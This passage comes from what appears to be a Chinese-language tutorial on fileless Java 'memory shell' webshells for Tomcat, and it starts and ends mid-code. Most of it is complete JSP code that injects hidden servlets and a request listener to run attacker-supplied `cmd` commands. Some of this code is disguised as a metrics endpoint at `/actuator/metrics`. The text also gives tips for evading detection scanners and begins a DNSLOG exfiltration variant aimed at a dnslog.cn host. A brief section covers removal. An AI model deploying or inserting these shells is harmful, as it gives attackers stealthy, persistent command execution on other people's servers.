class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span>  (StandardContext) standardContextField.get(applicationContext);<br>    <span class="hljs-comment">//创建wrapper，将Servlet名放到wrapper，最后实例化Shell2Servlet</span><br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper(); <br>    wrapper.setName(<span class="hljs-string">&quot;Shell2Servlet&quot;</span>); <br>    wrapper.setServletClass(Shell2Servlet.class.getName()); <br>    wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell2Servlet</span>());<br>    <span class="hljs-comment">//将wrapper放到standardContext里</span><br>    context.addChild(wrapper);<br>    <span class="hljs-comment">//映射url地址，注意如果是Tomcat7则使用addServletMapping(&quot;/shell2&quot;, &quot;Shell2Servlet&quot;)</span><br>    context.addServletMappingDecoded(<span class="hljs-string">&quot;/shell2&quot;</span>, <span class="hljs-string">&quot;Shell2Servlet&quot;</span>, <span class="hljs-literal">false</span>);<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/javamemshell1/1758788536034-5bdc0491-e345-4bac-b69f-b6aa986b1fc2.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="与filter内存马的区别"><a href="#与filter内存马的区别" class="headerlink" title="与filter内存马的区别"></a>与filter内存马的区别</h5><p>在标准的 Java Servlet 规范中，同一个 URL 路径通常只能由一个 Servlet 处理</p>
<p>如果存在相同URL的Servlet，后注册的servlet会覆盖前面的servlet，也就是说每个 URL 映射（如 <code>/api/test</code>）只会被其最后一个注册的servlet处理</p>
<p>这不同于filter，只需要放行，相同URL的filter都会被执行。</p>
<p>所以Servlet内存马通常绑定一个所有正常业务URL之外的路径，才不会覆盖正常业务的Servlet从而提高隐蔽性。</p>
<h5 id="提高servlet内存马隐蔽性"><a href="#提高servlet内存马隐蔽性" class="headerlink" title="提高servlet内存马隐蔽性"></a>提高servlet内存马隐蔽性</h5><p>与filter内存马方法大致相同</p>
<ol>
<li>通过header传递参数</li>
<li>参数和响应进行编码</li>
<li>回显伪装为json</li>
<li>dns外带回显</li>
<li>避免在代码中出现 “cmd.exe”、”sh”、”Runtime” 等敏感词</li>
<li>直接实现 <code>Servlet</code> 接口</li>
</ol>
<p>很多检测工具会扫描 <code>extends HttpServlet </code>的匿名类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.Servlet&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletRequest&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletResponse&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.ServletException&quot;</span> %&gt;<br><br>&lt;html&gt;<br><br>&lt;body&gt;<br>&lt;%!<br>    <span class="hljs-comment">// 直接实现 Servlet 接口，不继承 HttpServlet</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HiddenShell</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;&#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">null</span> || cmd.trim().isEmpty()) &#123;<br>                res.getWriter().println(<span class="hljs-string">&quot;No command provided.&quot;</span>);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">osName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>            <span class="hljs-keyword">if</span> (osName != <span class="hljs-literal">null</span> &amp;&amp; osName.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                isLinux = <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> scanner.hasNext() ? scanner.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> res.getWriter();<br>                out.println(output);<br>                out.flush();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                res.getWriter().println(<span class="hljs-string">&quot;Error: &quot;</span> + e.getMessage());<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;&#125;<br>        <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; &#125;<br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hidden Shell&quot;</span>; &#125;<br>    &#125;<br>%&gt;<br><br>&lt;%<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> request.getServletContext();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">appCtxField</span> <span class="hljs-operator">=</span> sc.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        appCtxField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">appCtx</span> <span class="hljs-operator">=</span> (ApplicationContext) appCtxField.get(sc);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">stdCtxField</span> <span class="hljs-operator">=</span> appCtx.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        stdCtxField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">stdCtx</span> <span class="hljs-operator">=</span> (StandardContext) stdCtxField.get(appCtx);<br><br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> stdCtx.createWrapper();<br>        wrapper.setName(<span class="hljs-string">&quot;MetricsCollector&quot;</span>); <span class="hljs-comment">// 伪装成监控组件</span><br>        wrapper.setServletClass(HiddenShell.class.getName());<br>        wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HiddenShell</span>());<br><br>        stdCtx.addChild(wrapper);<br>        stdCtx.addServletMappingDecoded(<span class="hljs-string">&quot;/actuator/metrics&quot;</span>, <span class="hljs-string">&quot;MetricsCollector&quot;</span>, <span class="hljs-literal">false</span>); <span class="hljs-comment">// 伪装成 Spring Boot 路径</span><br><br>        out.println(<span class="hljs-string">&quot;Shell registered at /actuator/metrics?cmd=...&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<h4 id="servlet内存马销毁"><a href="#servlet内存马销毁" class="headerlink" title="servlet内存马销毁"></a>servlet内存马销毁</h4><p>前面说到销毁内存马的本质是破坏挂载点。servlet内存马的挂载点是Servlet 容器（<code>ServletContext</code>） 。</p>
<p>重新部署war-&gt;加载新的<code>ServletContext</code></p>
<p>或者重启tomcat</p>
<p><img src="/mdimg/javamemshell1/1757939507574-2fdc9d0b-d9cd-442e-bb7d-af23976e74ff.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h3><ul>
<li><strong>挂载点：</strong><code>ServletContextListener</code>、<code>ServletRequestListener</code>等监听器。</li>
<li><strong>原理：</strong>攻击者注册一个恶意的<code>Listener</code>，利用其在特定生命周期事件（如应用启动、请求初始化、会话创建/销毁等）触发的特性来执行恶意逻辑。</li>
<li><strong>企业级危害：持久性较好</strong>。特别是<code>ServletContextListener</code>，它可以在应用启动时执行初始化恶意代码，甚至植入其他内存马。<code>ServletRequestListener</code>则可用于对每个请求进行监控或修改。</li>
</ul>
<h4 id="listener"><a href="#listener" class="headerlink" title="listener"></a>listener</h4><p>Listener的监听对象主要有三种类型。</p>
<p><strong>（1）ServletContext域对象——实现ServletContextListener接口</strong></p>
<ul>
<li>触发时机：Web 应用启动（<code>contextInitialized</code>）或关闭（<code>contextDestroyed</code>）</li>
</ul>
<p>作用：利用ServletContextListener监听器在创建ServletContext域对象时完成一些想要初始化的工作或者执行自定义任务调度</p>
<p><strong>（2）ServletRequest域对象——实现ServletRequestListener接口</strong></p>
<ul>
<li>触发时机：每次 HTTP 请求开始（<code>requestInitialized</code>）和结束（<code>requestDestroyed</code>）</li>
<li>没有 <code>ServletResponse</code>，无法直接回显命令执行结果</li>
</ul>
<p><strong>（3）HttpSession域对象——实现HttpSessionListener接口</strong></p>
<ul>
<li>触发时机：会话创建（<code>sessionCreated</code>）或销毁（<code>sessionDestroyed</code>）</li>
<li>不适合命令执行类内存马，可用于监控管理员登录（利用权限来执行敏感操作，获取数据）</li>
</ul>
<h5 id="ServletContextListener"><a href="#ServletContextListener" class="headerlink" title="ServletContextListener"></a><strong>ServletContextListener</strong></h5><ul>
<li><code>ServletContextListener</code> 的作用是监听 Web 应用的启动/销毁（<code>contextInitialized</code> / <code>contextDestroyed</code>）。</li>
<li>它 没有 <code>service()</code> 方法，无法接收 HTTP 请求参数。</li>
</ul>
<p>所以其无法命令执行，一般作为内存马的一个补充，当其他已经存在的内存马被发现后通过重启web应用或者tomcat时，通过<code>ServletContextListener </code>内存马在其重启后触发再次自动注入一个新的内存马</p>
<p>但是不能通过反射实现，通过反射注入的<code>ServletContextListener</code>是注入当前web应用的内存，重启或者重新部署就会销毁</p>
<p>这就需要写入到<code>.class</code>文件到<code>WEB-INF/classes/</code>等目录才能实现持久化重启时调用，但是这违背了内存马无文件落地的优势</p>
<p>下面实际上是servlet内存马</p>
<blockquote>
<p>严格来说，它更接近“Servlet 注入型内存马”，但利用了 ServletContextListener 的代码结构。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.http.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-keyword">if</span> (application.getAttribute(<span class="hljs-string">&quot;shell_installed&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>        out.println(<span class="hljs-string">&quot;Shell already installed.&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 1. 创建恶意 Servlet</span><br>        <span class="hljs-type">HttpServlet</span> <span class="hljs-variable">evilServlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpServlet</span>() &#123;<br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                resp.setContentType(<span class="hljs-string">&quot;text/plain;charset=UTF-8&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                <span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">null</span>) &#123;<br>                    resp.getWriter().println(<span class="hljs-string">&quot;Usage: ?cmd=whoami&quot;</span>);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>                    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(p.getInputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>                    String line;<br>                    <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                        resp.getWriter().println(line);<br>                    &#125;<br>                    br.close();<br>                    p.waitFor();<br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                    resp.getWriter().println(<span class="hljs-string">&quot;Error: &quot;</span> + e.toString());<br>                &#125;<br>            &#125;<br>        &#125;;<br><br>        <span class="hljs-comment">// 2. 获取 StandardContext</span><br>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> request.getServletContext();<br>        <span class="hljs-comment">// Tomcat 8/9/10 通用方式</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">contextField</span> <span class="hljs-operator">=</span> sc.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        contextField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">appCtx</span> <span class="hljs-operator">=</span> contextField.get(sc);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">stdContextField</span> <span class="hljs-operator">=</span> appCtx.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        stdContextField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">stdContext</span> <span class="hljs-operator">=</span> stdContextField.get(appCtx);<br><br>        <span class="hljs-comment">// 3. 创建 Wrapper</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">createWrapperMethod</span> <span class="hljs-operator">=</span> stdContext.getClass().getDeclaredMethod(<span class="hljs-string">&quot;createWrapper&quot;</span>);<br>        createWrapperMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> createWrapperMethod.invoke(stdContext);<br><br>        <span class="hljs-comment">// 设置 Servlet 和名字</span><br>        wrapper.getClass().getMethod(<span class="hljs-string">&quot;setServlet&quot;</span>, Servlet.class).invoke(wrapper, evilServlet);<br>        wrapper.getClass().getMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class).invoke(wrapper, <span class="hljs-string">&quot;DynamicShell&quot;</span>);<br><br>        <span class="hljs-comment">// 4. 添加 Wrapper 到 Context</span><br>        stdContext.getClass().getMethod(<span class="hljs-string">&quot;addChild&quot;</span>, Class.forName(<span class="hljs-string">&quot;org.apache.catalina.Container&quot;</span>)).invoke(stdContext, wrapper);<br><br>        <span class="hljs-comment">// 5. 关键：使用 addServletMappingDecoded（新版 Tomcat）</span><br>        <span class="hljs-comment">// 方法签名：addServletMappingDecoded(String pattern, String name)</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">addMappingMethod</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            addMappingMethod = stdContext.getClass().getMethod(<span class="hljs-string">&quot;addServletMappingDecoded&quot;</span>, String.class, String.class);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            <span class="hljs-comment">// 兼容旧版：回退到 addServletMapping</span><br>            addMappingMethod = stdContext.getClass().getMethod(<span class="hljs-string">&quot;addServletMapping&quot;</span>, String.class, String.class);<br>        &#125;<br>        addMappingMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        addMappingMethod.invoke(stdContext, <span class="hljs-string">&quot;/shell&quot;</span>, <span class="hljs-string">&quot;DynamicShell&quot;</span>);<br><br>        application.setAttribute(<span class="hljs-string">&quot;shell_installed&quot;</span>, <span class="hljs-literal">true</span>);<br>        out.println(<span class="hljs-string">&quot;Success! Access /shell?cmd=whoami&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(out));<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>

<h5 id="ServletRequestListener"><a href="#ServletRequestListener" class="headerlink" title="ServletRequestListener"></a><strong>ServletRequestListener</strong></h5><p>会在filter之前执行，并且不会拦截请求（也就是所有请求都只是经过<code>ServletRequestListener</code>，不影响后面<code>filter</code>、<code>servlet</code>的执行），所以不能够有回显到页面</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1.</span> 创建 ServletRequest / ServletResponse 对象<br>   │<br>   ▼<br><span class="hljs-number">2.</span> ➤ **ServletRequestListener.requestInitialized()**  ← 最早！<br>   │<br>   ▼<br><span class="hljs-number">3.</span> 执行 Filter Chain（按 web.xml 或注解顺序）<br>   │    - Filter1.doFilter()<br>   │    - Filter2.doFilter()<br>   │    - ...<br>   ▼<br><span class="hljs-number">4.</span> 调用目标 Servlet.service()（或 JSP）<br>   │<br>   ▼<br><span class="hljs-number">5.</span> Filter Chain 返回（逆序执行 chain.doFilter() 之后的代码）<br>   │<br>   ▼<br><span class="hljs-number">6.</span> 响应提交（flush、close）<br>   │<br>   ▼<br><span class="hljs-number">7.</span> ➤ **ServletRequestListener.requestDestroyed()**  ← 最晚！<br></code></pre></td></tr></table></figure>

<p>无回显可以反弹shell或者dnslog外带</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.net.InetAddress&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br><br>&lt;%<br>        <span class="hljs-type">String</span> <span class="hljs-variable">DNSLOG_DOMAIN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ifsjj6.dnslog.cn&quot;</span>;<br>        <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">srl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestListener</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> sre.getServletRequest().getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span> &amp;&amp; !cmd.trim().isEmpty()) &#123;<br>                        <span class="hljs-comment">// 执行命令并获取输出</span><br>                        <span class="hljs-type">boolean</span> <span class="hljs-variable">isWin</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>);<br>                        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(isWin ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;);<br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> p.getInputStream();<br>                        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> 